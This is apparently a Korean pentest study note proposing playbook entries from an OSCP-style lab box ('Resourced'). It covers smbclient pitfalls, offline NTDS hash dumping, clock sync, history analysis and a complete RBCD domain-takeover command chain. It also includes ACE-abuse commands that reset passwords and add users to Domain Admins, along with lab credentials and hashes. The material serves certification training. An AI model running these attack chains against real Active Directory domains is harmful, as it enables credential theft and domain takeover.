---
tags:
  - type/audit
  - platform/pg
---

# Resourced — `_PLAYBOOK` 이관 제안

`03. PG\Resourced.md` 를 OSCP 제출 보고서 골격으로 개작하며 박스 노트에서 «잘라낸» 학습 자료. 아래 제안마다 **①어느 절 ②병합/신규 ③넣을 본문 ④지우기 전 원문**을 적었다. 번호가 비어 있는 것은 신규이고 배정은 단독 기록자 몫이다.

⚠️ **이 파일을 쓰는 손과 `_PLAYBOOK.md` 를 쓰는 손은 다르다.** 워커는 여기까지만 한다.

---

## 제안 1 — `A-6-13` **병합**

**② 병합** (`A-6-13. 도구가 `Unknown argument error` 만 뱉고 어느 인자가 틀렸는지 안 알려준다`)

**③ 넣을 본문**

```markdown
**같은 뿌리의 더 비싼 변형 — 에러를 `> file` 로 리다이렉트해 «화면에서 못 봤다».** [[Resourced]] 실측:

`nxc-sweep` 은 표준 도구가 아니라 이 박스 작업 중 GitHub 에서 받아 `/usr/local/bin` 에 넣은 서드파티 래퍼임(`~/.zsh_history` 1344행). `-p`(평문)만 파싱하고 `-H`(해시)를 모름. `~/PG/Resourced/sweep.txt` 는 성과물이 아니라 **1줄짜리 사용법 에러**임:

​```text
Usage: nxc-sweep <IP> -u <username> -p <password> [global flags]
​```

`~/.zsh_history` 1392–1398행의 실제 순서:

​```text
nxc-sweep 192.168.125.175 -u users.txt -p hashs.txt
nxc-sweep 192.168.125.175 -u users.txt -H hashs.txt > sweep.txt
nxc-sweep 192.168.125.175 -u users.txt -H hashs.txt
nxc-sweep -h
ping 192.168.125.175
nxc smb 192.168.125.175 -u users.txt -H hashs.txt --no-bruteforce --continue-on-success
​```

`-h` 를 실제로 쳤는데도 **그 다음 명령이 `ping`** 임 — 인터페이스를 확인하고도 「도구가 아니라 박스가 죽었나」로 새었음. 두 번째 시도에서 `> sweep.txt` 로 에러를 파일에 가둬 화면이 비었던 것이 원인임.

→ **처음 돌리는 도구는 `> file` 이 아니라 `| tee file` 로 받을 것.** 화면과 파일에 동시에 남음.
→ **도구가 침묵하면 네트워크를 의심하기 «전에» 그 도구의 stdout/stderr 가 어디로 갔는지부터 볼 것.**
```

**④ 지우기 전 원문** (구 §6-1 전문)

> ### 6-1. `nxc-sweep` 은 `-H`(해시)를 지원하지 않는다 — `sweep.txt` 가 그 증거다
>
> Kali에 남은 `~/PG/Resourced/sweep.txt` 는 **1줄짜리 사용법 에러**다:
>
> ```text
> Usage: nxc-sweep <IP> -u <username> -p <password> [global flags]
> ```
>
> history를 보면 어떻게 여기 도달했는지가 보인다:
>
> ```text
> nxc-sweep 192.168.125.175 -u users.txt -p hashs.txt         ← ① 해시를 -p 로 줌
> nxc-sweep 192.168.125.175 -u users.txt -H hashs.txt > sweep.txt   ← ② -H 시도 → 사용법 에러가 파일에 저장됨
> nxc-sweep 192.168.125.175 -u users.txt -H hashs.txt         ← ③ 화면에서 재확인
> ping 192.168.125.175                                        ← ④ "박스가 죽었나?" 의심
> nxc smb 192.168.125.175 -u users.txt -H hashs.txt --no-bruteforce --continue-on-success   ← ⑤ 정답
> ```
>
> > [!danger] ④ 가 이 박스에서 가장 비싼 순간이다 — 도구 사용법 오류를 «네트워크 문제»로 오독했다
> > 래퍼가 `-p`만 파싱하는데 `-H`를 주니 사용법을 뱉었을 뿐인데, 출력을 파일로 리다이렉트해 **화면에서 못 봤고**, 그래서 `ping`으로 박스를 의심했다.
> > **반사 두 개**:
> > 1. **낯선 래퍼/스크립트는 `-h` 로 인터페이스부터 확인한다.** 표준 도구의 플래그가 그대로 통할 거라 가정하지 마라
> > 2. **`> file` 로 리다이렉트하면 에러가 안 보인다.** 처음 돌릴 때는 `| tee file` 로 화면과 파일에 동시에 남겨라

⚠️ **원문의 5단계 목록에 `nxc-sweep -h` 가 빠져 있었다**(실제 히스토리 1396행에 있음). 원문의 반사 1번(「`-h` 로 확인하라」)은 **이미 한 일**이었으므로 교훈을 위와 같이 고쳐 적었다.

관련: 구 §6-7 표의 `nxc sweep -t <IP>` / `nxc-sweep -t <IP>` 등 래퍼 문법 5회 시행착오(history 1342–1350) — 같은 뿌리이므로 함께 병합.

---

## 제안 2 — `A-1-30` **병합**

**② 병합** (`A-1-30. 익명 SMB 는 표기가 넷임 — 하나만 쳐보고 배제하지 말 것`. 그 절에 이미 `smbclient -L <IP>/<공유>` 문법 오류 ⚠️ 가 있어 같은 자리다)

**③ 넣을 본문**

```markdown
⚠️ **`smbclient` 의 함정 셋 — 이 순서로 확인할 것.** [[Resourced]] 는 성공까지 **8번** 틀렸음(`~/.zsh_history` 1360–1383행).

1. **`-p` 는 비밀번호가 아니라 «포트» 다.** 비밀번호는 `-U user%pass` 또는 프롬프트임. 위 시도들이 안 된 근본 원인
2. **공유 이름에 공백이 있으면 UNC 전체를 작은따옴표로 감쌀 것** — `'//IP/Password Audit'`. 감싸지 않으면 `Audit` 이 별개 인자가 됨
3. **`\\IP\share` 는 리눅스 셸에서 쓰지 말 것.** 백슬래시가 이스케이프로 먹힘. 항상 `//IP/share`

​```text
smbclient -U 'V.Ventz' -pHotelCalifornia194!' //192.168.125.175\
smbclient -U 'V.Ventz' -p 'HotelCalifornia194!' //192.168.125.175\
smbclient -U 'V.Ventz' -p 'HotelCalifornia194!' //192.168.125.175
smbclient -U 'V.Ventz' -p 'HotelCalifornia194!' \\192.168.125.175
smbclient -U 'V.Ventz' -p 'HotelCalifornia194!' 192.168.125.175
smbclient -U 'V.Ventz%HotelCalifornia194!' //192.168.125.175
smbclient -U 'V.Ventz%HotelCalifornia194!' //192.168.125.175/share
smbclient //192.168.125.175/Password Audit
smbclient '//192.168.125.175/Password Audit'
smbclient '//192.168.125.175/Password Audit' -U V.Ventz
​```

가장 안전한 한 줄:
​```bash
smbclient '//<IP>/<공백 든 공유>' -U '<user>%<pass>' -c 'recurse on; prompt off; mget *'
​```
`prompt off` 를 빼면 파일마다 y/n 을 묻고 비대화식 파이프에서 멈춤. `recurse on` 을 빼면 `mget *` 이 디렉터리를 건너뛰어 **최상위에 파일이 없는 공유에서는 아무것도 못 받고 끝남.**
```

**④ 지우기 전 원문** — 구 §6-2 전문(위 코드블록 원본 그대로 + 아래 danger 콜아웃)

> > [!danger] `smbclient` 의 함정 셋 — 이 순서로 확인하라
> > 1. **`-p` 는 비밀번호가 아니라 «포트» 다.** `smbclient`에서 비밀번호는 `-U user%pass` 또는 프롬프트다. 위 시도들이 안 된 근본 원인이 이것이다
> > 2. **공유 이름에 공백이 있으면 UNC 전체를 작은따옴표로 감싼다** — `'//IP/Password Audit'`. 감싸지 않으면 `Audit`이 별개 인자가 된다
> > 3. **`\\IP\share` 는 리눅스 셸에서 쓰지 마라.** 백슬래시가 이스케이프로 먹힌다. 항상 `//IP/share`
> >
> > 가장 안전한 한 줄:
> > ```bash
> > smbclient '//192.168.125.175/Password Audit' -U 'V.Ventz%HotelCalifornia194!'
> > ```

(구 §1-4 의 `[!tip] smbclient 로 공유를 통째로 받는 3줄 — 외워라` 콜아웃도 같은 자리로 접었다. 그 내용은 위 ③에 흡수됨. 3줄 자체는 박스 노트의 `Initial Access` 재현 절에 산문으로 남겼다.)

---

## 제안 3 — `A-2` **신규**

**① A-2. 진입 (foothold)** · **② 신규**

**③ 넣을 본문**

```markdown
#### A-2-??. 오프라인 하이브·NTDS 덤프가 `the following arguments are required: target` 로 죽는다 — 파일 탓이 아니다

**증상** — 공유에서 받은 `ntds.dit` + `SYSTEM`/`SECURITY` 를 `secretsdump` 에 넘겼는데 파싱 단계에서 죽음. 「하이브가 손상됐나」로 새기 쉬움.

​```text
$ impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit
usage: secretsdump.py [-h] [-ts] [-debug] [-system SYSTEM] [-bootkey BOOTKEY]
                      [-security SECURITY] [-sam SAM] [-ntds NTDS]
                      ...
                      target
secretsdump.py: error: the following arguments are required: target
​```

**원인** — `secretsdump.py [옵션들] target` 에서 `target` 은 **위치 인자**임. 원격이면 `domain/user:pass@host`, **오프라인 파일이면 그 자리에 문자열 `local`** 을 넣음.

​```bash
impacket-secretsdump -system SYSTEM -security SECURITY local -ntds ntds.dit
​```

→ **에러가 「인자가 부족하다」면 파일이 아니라 문법을 볼 것.** [[Resourced]] 는 `~/.zsh_history` 1357→1358 에 실패·성공이 연속 두 줄로 남아 있음. 오독의 방향이 위험했음 — `ntds.dit`(25MB)를 다시 받으러 가게 만듦.
```

**④ 지우기 전 원문** — 구 §6-3 전문

> ### 6-3. `secretsdump` 에서 `local` 을 빠뜨림
>
> history 1357 → 1358, **연속 두 줄**이다. §2-3에서 실제 에러를 재현했다.
> `local`이 옵션이 아니라 **위치 인자**라는 사실을 모르면 "하이브가 손상됐나?"로 새기 쉽다. 걸린 시간은 짧았지만 오독의 방향이 위험했다.

(메커니즘 설명 자체는 박스 노트 `Initial Access` 재현 절에 남겼다 — 재현에 필요하기 때문. `_PLAYBOOK` 에는 «증상 → 원인» 형태로 들어간다.)

---

## 제안 4 — `A-51` **병합 보강**

**② 병합** (`A-51. AD 박스에서 막히면 «취약점»이 아니라 넷을 먼저 본다`. 이미 [[Resourced]] 를 인용 중)

**③ 넣을 본문**

```markdown
**⑴ 시계 — `rdate -n` 의 `-n` 이 왜 필수인가.** `rdate` 기본은 RFC 868(TCP 37)인데 **Windows DC 는 그 서비스를 제공하지 않음**([[Resourced]] 의 `-p-` 전수 스캔 결과에 37번이 없음). `-n` 이 SNTP(UDP 123)를 쓰고 그것이 W32Time 이 실제로 서비스하는 프로토콜임.
​```bash
sudo rdate -n <DC_IP>       # 맞춘다
sudo rdate -n -p <DC_IP>    # 맞추지 않고 DC 시각만 본다 (안전한 사전 확인)
​```
[[Resourced]] `~/.zsh_history` 1466–1470 에 네 번의 시도가 남아 있음 — `sudo tee -a 192.168.120.175`(`/etc/hosts` 를 빠뜨려 **IP 이름의 쓰레기 파일을 만듦**) → `sudo ntpdate`(명령 없음) → `sudo ntp date`(오타) → `sudo rdate -n`(성공). 만든 쓰레기 파일은 1490–1492 에서 `cat` → `rm` → `rm -rf` 로 뒤늦게 발견돼 지워졌음.
**`sudo tee -a` 는 대상 파일명을 빠뜨리면 조용히 새 파일을 만든다** — 인자 하나가 빠진 것을 에러로 알려주지 않음.

**⑷ IP 재배정 — 「알아챈 뒤에도」 손이 옛 IP 를 친다.** [[Resourced]] 는 1466행에서 이미 신 IP(120.175)로 넘어갔는데, psexec 로 SYSTEM 을 잡은 **뒤인** 1500→1501 에 다시 `evil-winrm -i 192.168.125.175`(옛 IP) → `-i 192.168.120.175`(신 IP)를 연속으로 침. **한 번 갱신했다고 끝이 아님** — 셸 히스토리·스크립트·`/etc/hosts` 에 남은 옛 IP 가 계속 되살아남.
```

**④ 지우기 전 원문** — 구 §6-4·§6-5·§6-6 전문. 아래에 핵심만 인용(전문은 `03. PG\_backup\Resourced.md.bak` 1170–1244행)

> ### 6-4. `ntpdate` 가 Kali에 없다 — Kerberos 시계 동기
> RBCD 단계 직전, history 1466–1470행에 **네 번의 시도**가 있다:
> ```text
> sudo tee -a 192.168.120.175        ← ① /etc/hosts 를 빠뜨려 «파일» 을 만들어 버림
> sudo ntpdate 192.168.120.175       ← ② 명령 없음
> sudo ntp date 192.168.120.175      ← ③ 오타
> sudo rdate -n 192.168.120.175      ← ④ 성공 경로
> ping 192.168.120.175
> ```
> **①이 만든 쓰레기 파일**은 나중에 발견돼 지워졌다 — history 1490–1492: `cat 192.168.120.175` → `rm 192.168.120.175` → `rm -rf 192.168.120.175`.
> > [!danger] 현행 Kali에는 `ntpdate` 가 «패키지조차» 없다 — `rdate -n` 을 외워라
> > `Candidate: (none)` — 설치가 안 된 게 아니라 **저장소에서 사라졌다.**
> > **`-n` 이 필수인 이유**: `rdate`의 기본은 RFC 868 (TCP 37번) 인데, Windows DC는 그 서비스를 제공하지 않는다. 실제로 이 박스의 `-p-` 전수 스캔 결과에 37번 포트가 없다. `-n`을 주면 SNTP(UDP 123) 를 쓰고, 그것이 Windows Time(W32Time)이 실제로 서비스하는 프로토콜이다.
>
> #### 왜 Kerberos에서 시계가 문제인가 — `KRB_AP_ERR_SKEW`
> **주의**: 이 박스에서 실제로 이 에러가 났다는 기록은 없다. 시계를 먼저 맞추고 들어간 것이고, 그래서 §4-4 이후가 매끄럽게 진행됐다.
> nmap 출력이 사전 점검 도구가 된다 — `kerberos-sec (server time: …)` 와 `ssl-date: … 0s from scanner time` 를 자기 시계와 비교하라.
>
> ### 6-5. 이름 해석 — `getent hosts` 가 빈손으로 돌아왔다
> > 등록해야 할 이름은 셋이다 — **FQDN**(SPN용) · 도메인(LDAP/Kerberos realm용) · 넷바이오스명.
> > 이걸 미루면 **Kerberos·LDAPS·`-k` 인증이 전부 원인 불명으로 실패**한다. 비용 30초, 회수 30분.
>
> ### 6-6. 리버트로 IP가 바뀐 것을 늦게 알아챘다
> ```bash
> evil-winrm -i 192.168.125.175 -u 'L.Livingstone' -H 19a3a7550ce8c505c2d46b5e39d6f808   ← 옛 IP
> evil-winrm -i 192.168.120.175 -u 'L.Livingstone' -H 19a3a7550ce8c505c2d46b5e39d6f808   ← 신 IP
> ```
> > [!tip] 세션을 다시 시작하면 첫 명령은 IP 확인이다
> > ```bash
> > ip -br a                 # 내 tun0 (리버스셸 LHOST 가 바뀐다)
> > ping -c1 <타겟IP>        # 타겟 생존
> > grep -n '<도메인>' /etc/hosts   # 낡은 항목이 남아 있는지
> > ```

⚠️ **원문 §6-6 은 이 두 줄을 「리버트를 늦게 알아챘다」의 증거로 읽었으나 위치가 다르다.** 히스토리상 1500–1501 은 psexec 성공(1483) **뒤**이고 Nagoya 작업(`mkdir Nagoya`·`whatweb 192.168.120.21`)이 이미 시작된 구간이다. 즉 「늦게 알아챈 것」이 아니라 **알아챈 뒤에도 습관이 옛 IP 를 쳤다**는 기록이다. 교훈을 그렇게 고쳐 적었다.

---

## 제안 5 — `A-6` **신규**

**① A-6. 판단·검증 (메타)** · **② 신규**

**③ 넣을 본문**

```markdown
#### A-6-??. `~/.zsh_history` 의 «줄 순서»는 시간 순서가 아니다

**증상** — 사후에 히스토리를 위에서 아래로 읽어 작업 순서를 재구성했는데, 인과가 뒤집힌 구간이 나옴.

[[Resourced]] 실측 — `~/PG/Resourced/` 파일 mtime 과 대조하면 히스토리가 스스로 모순됨:

| 히스토리 행 | 내용 | 논리적 순서 |
|---|---|---|
| 1356 | `cp ntds.dit ../registry` | 공유를 **이미 받은 뒤** |
| 1357–1358 | `impacket-secretsdump …`(실패→성공) | 그 뒤 |
| 1359 | `nxc winrm … -H …` | 해시를 **이미 얻은 뒤** |
| 1360–1383 | `smbclient …` 8회 시행착오 → 공유 회수 성공 | **공유를 받는 중** |

**원인 `[가정]`** — zsh 가 `INC_APPEND_HISTORY` 없이 **셸 종료 시 그 셸의 히스토리를 통째로 append** 하기 때문. 두 셸(`registry/` 와 `Active Directory/`)을 나란히 띄우면 각자의 블록이 «종료 시각 순»으로 끼어들어 줄 순서와 실제 시각이 어긋남. 정확한 zsh 옵션 설정을 확인하지는 않았음.

→ **시간 서사는 «히스토리 줄 번호»가 아니라 «파일 mtime + 스크린샷 파일명»으로 세울 것**(A-64). 히스토리가 확실하게 증언하는 것은 **「이 명령을 쳤다」와 「이 두 줄이 인접했다」**까지임.
→ **「연속 두 줄이므로 곧바로 재시도했다」는 판정은 같은 셸 안이라는 증거가 있을 때만 성립함.**
```

**④ 지우기 전 원문** — 이 항목은 개작 과정에서 **새로 발견한 것**이라 원문이 없다. 근거는 위 표(2026-08-26 `sed -n '1330,1520p' ~/.zsh_history` 로 확인).

---

## 제안 6 — `B-52` **병합 + 정정**

**② 병합** (`B-52. 실패 표시가 실패를 뜻하지 않는다 — NTLM 상태 코드를 읽는다`)

**🔴 기존 본문에 부정확한 곳이 있다.** 현행:

> `STATUS_PASSWORD_EXPIRED`·`MUST_CHANGE`·`ACCOUNT_RESTRICTION` 은 **«자격증명이 맞다»는 증거**임. ([[Resourced]] — 만료되지 않은 두 계정만 통과했고, 그 둘이 `pwdneverexpires=true` 임이 BloodHound 덤프로 확인됐음)

`users.json` 을 전량 조회하면 `pwdneverexpires=true` 는 **넷**이다 — `Administrator`·`Guest`·`V.Ventz`·`L.Livingstone`. 「그 둘이 true」는 맞지만 「true 인 것이 그 둘」은 아니다.

**③ 넣을 본문** (괄호 안을 아래로 교체 + 두 항목 추가)

```markdown
([[Resourced]] — `pwdneverexpires=true` 인 계정은 **넷**(`Administrator`·`Guest`·`V.Ventz`·`L.Livingstone`)이었고 그중 둘만 인증에 성공했음. `Administrator` 는 `STATUS_LOGON_FAILURE`, `Guest` 는 `STATUS_ACCOUNT_DISABLED`. 반대로 `false` 인 계정은 **전부** `PASSWORD_EXPIRED` 였음 — 인과는 성립하나 **`true` 가 곧 통과는 아님**)

**`(Pwn3d!)` 뒤에 붙는 `[-]` 줄에 결과를 뒤집히지 말 것.** [[Resourced]] 의 nxc WinRM 출력은 세 줄인데 2행이 `[+] … (Pwn3d!)`, 3행이 `[-] … zip() argument 2 is longer than argument 1` 임(출처: `파일보관/Pasted image 20260703142509.png`). 3행은 nxc 내부 예외이지 인증 실패가 아니고, 실제로 바로 뒤 `evil-winrm` 이 붙었음. **`(Pwn3d!)` 는 「대화형 셸이 열린다」는 확정 신호임.**

**백업에서 뽑은 해시는 «백업 시점»의 것이다.** [[Resourced]] 의 `ntds.dit` 는 2021-10-05 스냅샷이라 도메인 `Administrator` NT 해시(`12579b1666d4ac10f0f59f300776495f`)가 `STATUS_LOGON_FAILURE` 였음 — 그 사이에 비밀번호가 바뀐 것. **가장 값나가는 해시가 가장 먼저 낡는다.** 관리자 해시가 안 통해도 덤프 전체를 의심하지 말 것.
```

**④ 지우기 전 원문** — 구 §2-4 · §4-1 · §6-13 두 번째 항목

> ### 2-4. 왜 «만료된 비밀번호»가 해시를 무력화하는가
> - `STATUS_LOGON_FAILURE` — 자격증명이 **틀렸다**
> - `STATUS_ACCOUNT_DISABLED` — 자격증명은 맞지만 **계정이 비활성**
> - **`STATUS_PASSWORD_EXPIRED` — 자격증명이 «맞다».** NTLM 검증은 통과했고, 서버가 "비밀번호를 바꾸기 전에는 세션을 못 준다"고 거절한 것이다
>
> **`DONT_EXPIRE_PASSWORD`(userAccountControl 비트 0x10000)가 켜진 계정 정확히 둘만 인증에 성공했다.** 2021-10-01에 설정된 비밀번호들이 기본 최대 사용 기간(42일)을 한참 넘겼기 때문이다. 인과가 정확히 맞아떨어진다.
>
> > [!tip] 일반화 — 해시 다발을 얻으면 «만료되지 않은 계정»부터 노려라
> > 도메인 해시를 통째로 얻었는데 대부분 `PASSWORD_EXPIRED`가 뜨면, 그건 막다른 길이 아니라 **후보가 좁혀진 것**이다.
> > ```bash
> > ldapsearch -x -H ldap://<IP> -D '<user>@<domain>' -w '<pass>' -b '<baseDN>' \
> >   '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))' sAMAccountName
> > ```
> > `1.2.840.113556.1.4.803` 은 **LDAP_MATCHING_RULE_BIT_AND** 다 — 비트 AND 매칭 OID. 이 OID를 모르면 UAC 플래그 필터를 손으로 못 쓴다. 외워 둘 값이다.
> > 같은 정보를 nxc 모듈로도 얻는다: `nxc ldap <IP> -u .. -p .. --password-not-required`, `--admin-count`, `--trusted-for-delegation`.
>
> ### 6-13 (일부)
> - **`Administrator` NT 해시 `12579b1666d4ac10f0f59f300776495f` 로 PtH** — §4-1에서 `STATUS_LOGON_FAILURE`가 났다. 도메인 Administrator의 비밀번호가 백업 시점 이후에 변경됐다는 뜻이다. `ntds.dit`는 2021-10-05의 스냅샷이므로 당연한 결과다. "백업에서 뽑은 해시는 «백업 시점»의 것이다" — 이게 이 실패의 교훈이다

(`ldapsearch` 비트필터와 상태코드 3분류는 박스 노트 `Initial Access` 재현 절에 남겼다 — 이 박스의 재현에 직접 필요하기 때문.)

---

## 제안 7 — `B-5` **신규**

**① B-5. Active Directory** · **② 신규**

**③ 넣을 본문**

```markdown
#### B-5-??. SMB 공유에 `Active Directory\` + `registry\` 가 «함께» 있으면 그것은 `ntdsutil` IFM 백업이다

**신호** — 비표준 공유(`Password Audit`·`Backups`·`IT`) 안에 이 배치가 있으면 **도메인 전체 자격증명 데이터베이스**임:

| 경로 | 정체 |
|---|---|
| `Active Directory\ntds.dit` | AD 데이터베이스 본체(ESE/JET DB) |
| `Active Directory\ntds.jfm` | ESE 점검 파일 |
| `registry\SYSTEM` | bootKey(SysKey)가 여기 있음 — **없으면 아무것도 못 깜** |
| `registry\SECURITY` | LSA 시크릿(`$MACHINE.ACC`·`DPAPI_SYSTEM`·`NL$KM`) |

`ntdsutil "activate instance ntds" "ifm" "create full <경로>"` 가 정확히 이 두 디렉터리·네 파일·이 이름을 만듦. 대안 후보는 이 배치를 못 만듦 — `secretsdump -just-dc`(DRSUAPI)는 파일을 아예 안 만들고, `reg save` 는 하이브만, `esentutl /y` 는 `ntds.dit` 한 개만.

**오프라인 복호화 사슬(삼중 포장)**
​```text
SYSTEM 하이브 → HKLM\SYSTEM\CCS\Control\Lsa 의 {JD},{Skew1},{GBG},{Data} «클래스 이름»
   → 이어붙여 고정 순열로 뒤섞음 ⇒ bootKey (16바이트)
ntds.dit → datatable 의 Domain 개체 pekList → bootKey 로 복호화 ⇒ PEK
ntds.dit → 사용자 행의 unicodePwd/dBCSPwd → PEK + RID 로 복호화 ⇒ NT 해시 / Kerberos 키
​```
​```bash
cp "Active Directory/ntds.dit" registry/ && cd registry
impacket-secretsdump -system SYSTEM -security SECURITY local -ntds ntds.dit | tee dump.txt
​```

**출력에서 반드시 읽을 것** — `Target system bootKey: 0x…`(여기서 실패하면 하이브가 잘못된 것) · `PEK # 0 found and decrypted`(이 줄이 없으면 뒤의 해시는 전부 쓰레기) · `RESOURCEDC$` NT해시 == `$MACHINE.ACC` NT해시(같은 비밀의 다른 저장소. 자기 검증 지점) · `31d6cfe0d16ae931b73c59d7e0c089c0`(빈 비밀번호의 NT 해시) · `aad3b435b51404eeaad3b435b51404ee`(빈 LM 해시의 고정값).

**이것은 DCSync 가 «아니다».** 네트워크 RPC 호출이 없고 출력에 `Using the DRSUAPI method` 줄이 없음. 태그를 `tech/ad/dcsync` 로 붙이면 틀림.

**`SECURITY` 하이브는 NT 해시에 필요 없다** — 그것이 주는 것은 별개 전리품임: `$MACHINE.ACC`(실버 티켓 재료) · `DPAPI_SYSTEM`(저장 자격증명·브라우저 비밀번호) · `NL$KM`(MSCache2 키). DC 는 보통 로그온을 캐시하지 않아 캐시 항목은 비어 있음.

**출처** — [[Resourced]](`Password Audit` 공유). `SeBackupPrivilege` 로 라이브 `ntds.dit` 를 직접 뜨는 경로는 B-53, DRSUAPI DCSync 는 [[Hutch]].
```

**④ 지우기 전 원문** — 구 §2-1 · §2-2 · §3 표(요약). 전문은 `_backup\Resourced.md.bak` 358–420행·763–783행. 박스 노트에는 재현에 필요한 만큼(배치 표·사슬 다이어그램·읽을 줄 표)을 그대로 남겼으므로 **이 제안은 「일반화」쪽만 이관**한다.

---

## 제안 8 — `B-54` **병합 보강**

**② 병합** (`B-54. DC 컴퓨터 객체에 붙은 저권한 ACE는 곧 도메인 장악이다`)

**③ 넣을 본문**

```markdown
**RBCD 3단 — 명령은 셋뿐임**([[Resourced]] 실측, 07-06 10:48→10:50 사이 **2분**):
​```bash
impacket-addcomputer -computer-name '4Leaf$' -computer-pass 'a123a123!@' -dc-ip <DC> '<dom>/<user>' -hashes :<NTHASH>
impacket-rbcd -delegate-from '4Leaf$' -delegate-to '<DC호스트>$' -action write -dc-ip <DC> '<dom>/<user>' -hashes :<NTHASH>
impacket-getST -spn 'cifs/<FQDN>' -impersonate Administrator -dc-ip <DC> '<dom>/4Leaf$:a123a123!@'
export KRB5CCNAME=$(realpath 'Administrator@cifs_<FQDN>@<REALM>.ccache') && klist
impacket-psexec -k -no-pass <FQDN>
​```

**함정 다섯**
- `-computer-name '4Leaf$'` — **`$` 를 붙이고 «작은»따옴표로 감쌀 것.** 큰따옴표면 셸이 `$'` 를 변수로 해석해 이름이 깨짐
- `-hashes :<NTHASH>` — **콜론으로 시작.** LM 자리를 빈 문자열로 둠
- `addcomputer` 기본 `-method` 는 **SAMR** 이고 그것이 정답임 — `--help` 원문 *"SAMR works over SMB. LDAPS has some certificate requirements and isn't always available."*
- `rbcd -action write` 출력의 첫 줄 `Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty` 가 **쓰기 전 기존 값 확인**임. 값이 있으면 덮어쓰기가 정상 위임을 깨뜨림 → 습관적으로 `-action read` 먼저, 끝나면 `remove`(내 항목만)/`flush`(전체)
- `getST` 인증 주체는 **ACE 를 가진 사용자가 아니라 «새로 만든 머신계정»** 임. 위임 권한은 그쪽에 있음

**`getST` 는 TGT 를 «받되 저장하지 않는다».** 실제 출력이 `[*] Getting TGT for user` → `Requesting S4U2self` → `Requesting S4U2Proxy` → `Saving ticket in …ccache` 임(출처: `파일보관/Pasted image 20260706105049.png`). ccache 에 남는 자격증명은 **1개**이고 그것은 S4U2Proxy 결과인 서비스 티켓임 — `klist` 에 `krbtgt/<REALM>` 항목이 없음.
→ **티켓은 SPN 단위임.** `cifs/` 만 있으면 `secretsdump -k` 로 DCSync 를 못 함. 목적별로 `-spn` 을 골라 재발급할 것 — `cifs/`(psexec·smbclient) · `http/`(WinRM) · `ldap/`(DCSync) · `host/`(다목적).

**`-k -no-pass` 는 IP 가 아니라 FQDN 을 타겟으로 받는다.** impacket `--help` 원문 *"Grabs credentials from ccache file (KRB5CCNAME) **based on target parameters**"* — 타겟 문자열로 SPN 을 조립하므로 IP 를 주면 `cifs/<IP>` 를 찾다 실패함. `/etc/hosts` 등록과 FQDN 타겟은 **둘이 함께**여야 함. 그리고 **추가 전에 옛 항목을 지울 것** — `sudo sed -i '/<도메인>/d' /etc/hosts` 를 먼저 돌리지 않으면 리버트 전 IP 가 먼저 매칭돼 이김.

**S4U2Self 티켓이 forwardable 이어야 S4U2Proxy 가 성립함.** `Protected Users` 멤버나 `Account is sensitive and cannot be delegated`(UAC 0x100000)가 켜진 계정은 사칭 불가 — 사칭이 실패하면 가장 먼저 이걸 의심하고 대상을 다른 도메인 관리자로 바꿀 것. `impacket-describeTicket` 의 `Flags` 에서 `forwardable` 을 눈으로 확인할 수 있음.

**`describeTicket` 이 뱉는 `Kerberoast hash` 는 크랙 대상이 아님** — 이 티켓은 머신계정 키(120자 랜덤)로 암호화돼 있음. Kerberoasting 이 성립하는 것은 사람이 만든 서비스 계정의 티켓뿐임.

**MAQ 가 0 이면 RBCD 가 막힘.** 대안 셋 — ⑴ 이미 아는 머신계정 자격증명을 `-delegate-from` 에 사용(`$MACHINE.ACC` 해시) ⑵ Shadow Credentials(ADCS 필요) ⑶ 다른 경로. 사전 확인은 `nxc ldap <IP> -u .. -p .. -M maq`. ⚠️ **BloodHound LEGACY 의 `domains.json` 은 `machineaccountquota` 를 수집하지 않음** — 속성 키가 `description`/`distinguishedname`/`domain`/`domainsid`/`functionallevel`/`highvalue`/`name`/`whencreated` 뿐임(실측).

**컴퓨터 객체의 비밀번호는 리셋하지 말 것** — DC 머신계정 비밀번호를 바꾸면 도메인이 깨짐. 사용자 객체의 리셋도 되돌릴 수 없음. 그래서 컴퓨터 객체에서는 «위임 속성»을 건드리는 쪽이 정석임.

**오설정을 기본 권한 더미에서 골라내는 법** — 컴퓨터 객체 ACE 를 전부 뽑아 `PrincipalType` 과 `IsInherited` 를 볼 것. RID 512(Domain Admins)·519(Enterprise Admins)·526/527(Key Admins)·S-1-5-32-544(Builtin\Administrators)는 정상이고 전부 `Group` 임. **`User` 타입 + `inherited=false` 가 오설정임** — [[Resourced]] 의 정답이 정확히 그 한 줄이었음.
```

**④ 지우기 전 원문** — 구 §2-5 · §2-6 · §2-7 · §2-9 · §4-4 · §4-5 · §4-6 · §7-2C. 전문은 `_backup\Resourced.md.bak` 483–546행 · 635–676행 · 902–1075행 · 1451–1458행. 박스 노트에는 **이 박스의 재현에 필요한 것**(명령·출력·ACE 덤프·티켓 검증)을 남겼고, 위 ③은 **일반화된 반사**만 뽑은 것이다.

특히 아래 두 표는 박스 노트에서 통째로 잘라냈다:

> #### `GenericAll` 이 사용자 객체에 붙었을 때와 «컴퓨터» 객체에 붙었을 때는 무기화가 다르다
> (사용자/그룹/컴퓨터 3행 표 — 축약본은 박스 노트에 남김)
>
> ### 2-9. ACE 무기화 지도 — 이 박스의 DACL에 실제로 있던 «전부»
> | `GenericAll` / `GenericWrite` / `WriteDacl` / `WriteOwner` / `Owns` / `AddKeyCredentialLink` | … | `impacket-rbcd`·`pywhisker`·`impacket-dacledit`·`impacket-owneredit`·`certipy shadow auto` |
> > [!tip] 네 개(`GenericAll`·`GenericWrite`·`WriteDacl`·`WriteOwner`)는 사실상 같은 것이다
> > `WriteOwner` → `WriteDacl` → `GenericAll` → `GenericWrite` 로 **한 방향으로 승격된다.**
> > **반사**: 컴퓨터 객체에 이 넷 중 하나 → RBCD 를 먼저 시도(ADCS 불필요) → 막히면 Shadow Credentials(ADCS 필요).
>
> #### 사용자·그룹 객체에 붙었을 때는 무기화가 달라진다 — 시험에서 더 흔한 쪽
> | `ForceChangePassword` / `AddMember` / `WriteSPN` | … |
> ```bash
> net rpc password 'TARGET' 'NewPass123!' -U 'DOMAIN/attacker%pass' -S <DC>
> bloodyAD --host <DC> -d <domain> -u <u> -p <p> set password 'TARGET' 'NewPass123!'
> net rpc group addmem 'Domain Admins' 'attacker' -U 'DOMAIN/attacker%pass' -S <DC>
> bloodyAD --host <DC> -d <domain> -u <u> -p <p> add groupMember 'Domain Admins' 'attacker'
> ```

---

## 제안 9 — `C-2` **병합** (중복이면 폐기)

